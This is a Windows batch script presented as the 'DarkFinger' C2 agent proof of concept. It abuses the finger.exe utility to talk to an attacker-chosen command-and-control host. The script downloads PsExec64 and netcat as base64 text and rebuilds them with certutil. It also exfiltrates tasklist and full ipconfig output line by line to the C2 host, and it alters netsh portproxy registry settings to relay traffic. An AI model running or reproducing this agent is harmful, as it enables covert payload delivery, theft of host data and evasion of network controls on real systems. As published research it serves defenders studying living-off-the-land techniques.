@ECHO OFF
CLS

ECHO [+] Windows TCPIP Finger CMD Agent (c)
ECHO [+] For DarkFinger C2 Server PoC
ECHO [+] By hyp3rlinx
ECHO [+] ApparitionSec
ECHO  ===================================
@ECHO.

REM Default download save location.
CD \Users\%username%\Desktop
REM Default download delay time to try an ensure full transfer.
SET  DELAY=10
SET FAIL_MSG=[!] Attempted a failed Admin operation ugh :(

net session >nul 2>&1
IF %errorLevel% == 0 (
    ECHO [+] Got Admin privileges!.
    SET  /a Admin = 0
    GOTO Init
) ELSE  (
    ECHO [!] Agent running as non-admin, if you can escalate privs re-run the agent!.
    SET /a Admin = 1
	SET  DARK_PORT=79
    GOTO CheckOutbound79
)

:Init
for /f "tokens=1-2 delims=:" %%a in ('ipconfig^|find "IPv4"') do IF NOT DEFINED LOCAL_IP set LOCAL_IP=%%b
SET LOCAL_IP=%LOCAL_IP: =%
ECHO [+] Local IP: %LOCAL_IP%
REM default for non admin as cant set Portproxy.
SET /P DARK_IP="[+] DarkFinger C2 Host/IP: "
SET /P DARK_PORT="[+] DarkFinger C2 Port: "
IF NOT %DARK_PORT%==79 (
ECHO [!] Ports other than 79 typically require a Portproxy.
GOTO AddNetshPortProxy
) ELSE (
GOTO CmdOpt
)

:CheckOutbound79
ECHO [!] Must use the default Port 79 :( good luck.
SET /P CHKPORT="[+] Check if hosts reachable? Y to continue N to abort: "
SET CHKPORT=%CHKPORT: =%
 IF /I %CHKPORT% == y (
   SET /P DARK_IP="[+] DarkFinger C2 Host/IP: "
   cmd /c powershell "$c=New-Object System.Net.Sockets.TCPClient;try{$c.Connect('%DARK_IP%','%DARK_PORT%')}catch{};if(-Not $c.Connected){echo `n'[-] Port 79 unreachable :('}else{$c.Close();echo `n'[-] Port 79 reachable :)'}"
    ECHO.
  ) ELSE (
     ECHO [!] Aborting... :(
    GOTO Close
 )
 

:CmdOpt
ECHO  1.Download PsExec64
ECHO  2.Download Nc64
ECHO  3.Exfil Tasklist
ECHO  4.Exfil IP Config
ECHO  5.Remove Netsh PortProxy
ECHO  6.Change C2 Server Port - 22 43 53 79 80 443
ECHO  7.Show Current Portproxy
ECHO  8.Change Portproxy
ECHO  9.Delete Portproxy and exit
ECHO  10.Exit Agent
@ECHO.
SET /P doit="Select option: "
IF "%doit%"=="1" GOTO PsExec64
IF "%doit%"=="2" GOTO Nc64
IF "%doit%"=="3" GOTO ExfilTasklist
IF "%doit%"=="4" GOTO ExfilIPConfig
IF "%doit%"=="5" GOTO RemNetShPortProxy
IF "%doit%"=="6" GOTO ChgC2ServerPort
IF "%doit%"=="7" GOTO ShowPortProxy
IF "%doit%"=="8" GOTO ChgPortProxy
IF "%doit%"=="9" GOTO DelProxyNClose
IF "%doit%"=="10" GOTO Close


:ChgPortProxy
IF %Admin% == 0 (
 GOTO Init
) ELSE (
ECHO %FAIL_MSG%
@ECHO.
GOTO CmdOpt
)

:PsExec64
SET Tool=PS
ECHO [-] Downloading PsExec64.exe, saving to Desktop as PS.EXE
ECHO [-] Wait...
IF %DARK_PORT%==79 (
SET IP2USE=%DARK_IP%
) ELSE (
SET IP2USE=%LOCAL_IP%
)
call finger ps%DELAY%@%IP2USE% > tmp.txt
GOTO CleanFile


:Nc64
SET Tool=NC
ECHO [-] Downloading Nc64.exe, saving to Desktop as NC.EXE
ECHO [-] Wait...
IF %DARK_PORT%==79 (
SET IP2USE=%DARK_IP%
) ELSE (
SET IP2USE=%LOCAL_IP%
)
call finger nc%DELAY%@%IP2USE% > tmp.txt
GOTO CleanFile

REM remove first two lines of tmp.txt as contains Computer name.
:CleanFile
call cmd /c more +2 tmp.txt > %Tool%.txt
GOTO RemoveTmpFile

:RemoveTmpFile
call cmd /c del %CD%\tmp.txt
GOTO B64Exe

REM Reconstruct executable from the Base64 text-file.
:B64Exe
call certutil -decode %CD%\%Tool%.txt %CD%\%Tool%.EXE 1> nul
@ECHO.
call cmd /c del %CD%\%Tool%.txt
GOTO CmdOpt

:ExfilTasklist
REM uses "." prefix to flag as incoming exfil data.
IF "%DARK_PORT%"=="79" (
SET USE_IP=%DARK_IP%
) ELSE (
SET USE_IP=%LOCAL_IP%
)
cmd /c for /f "tokens=1" %%i in ('tasklist') do finger ."%%i"@%USE_IP%
GOTO CmdOpt

:ExfilIPConfig
REM uses "." prefix to flag as incoming exfil data.
IF "%DARK_PORT%"=="79" (
SET USE_IP=%DARK_IP%
) ELSE (
SET USE_IP=%LOCAL_IP%
)
cmd /c for /f "tokens=*" %%a in ('ipconfig /all') do  finger ".%%a"@%USE_IP%
GOTO CmdOpt


:DelProxyNClose
ECHO [!] Removing any previous Portproxy from registry and exiting.
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4 /F  >nul 2>&1
ECHO [!] Exiting...
EXIT /B


:AddNetshPortProxy
SET OK=0
SET /P OK="[!] 1 to Continue:"
IF NOT %OK% EQU 1 (
 ECHO [!] Aborted...
 @ECHO.
 GOTO CmdOpt
)
ECHO [!] Removing any previous Portproxy from registry.
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4 /F  >nul 2>&1
SET LOCAL_FINGER_PORT=79
IF %DARK_PORT%==79 call cmd /c netsh interface portproxy add v4tov4 listenaddress=%LOCAL_IP% listenport=%LOCAL_FINGER_PORT% connectaddress=%DARK_IP% connectport=%DARK_PORT%
IF %DARK_PORT%==79 call cmd /c netsh interface portproxy add v4tov4 listenaddress=%LOCAL_IP% listenport=%DARK_PORT% connectaddress=%LOCAL_IP% connectport=%LOCAL_FINGER_PORT%
IF NOT %DARK_PORT% == 79 call cmd /c netsh interface portproxy add v4tov4 listenaddress=%LOCAL_IP% listenport=%LOCAL_FINGER_PORT% connectaddress=%DARK_IP% connectport=%DARK_PORT%
IF NOT %DARK_PORT% == 79 call cmd /c netsh interface portproxy add v4tov4 listenaddress=%LOCAL_IP% listenport=%DARK_PORT% connectaddress=%LOCAL_IP% connectport=%LOCAL_FINGER_PORT%
IF %Admin% == 0 netsh interface portproxy show all
GOTO CmdOpt

:RemNetShPortProxy
IF %Admin% == 1 (
ECHO %FAIL_MSG%
@ECHO.
GOTO CmdOpt
) ELSE (
ECHO [!] Removing NetSh PortProxy from registry.
REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4 /F  >nul 2>&1
)
IF %DARK_PORT%==79 (
GOTO CmdOpt
) ELSE (
GOTO Init
)

:ShowPortProxy
netsh interface portproxy show all
GOTO CmdOpt

REM Allows agent to change the DarkFinger C2 listener port.
:ChgC2ServerPort
IF %Admin% == 1 (
ECHO %FAIL_MSG%
@ECHO.
GOTO CmdOpt
)
SET /P TMP_PORT="[+] DarkFinger listener Port: "
IF %DARK_PORT%==79 finger !%TMP_PORT%!@%DARK_IP%
IF NOT %DARK_PORT%==79 finger !%TMP_PORT%!@%LOCAL_IP%
SET DARK_PORT=%TMP_PORT%
ECHO [!] Attempted to change the DarkFinger remote Port to %TMP_PORT%.
IF NOT %DARK_PORT%==79 ECHO [!] Non default finger port used, must set a new Portproxy. (
GOTO RemNetShPortProxy
) ELSE (
GOTO CmdOpt
)

:Close
EXIT /B
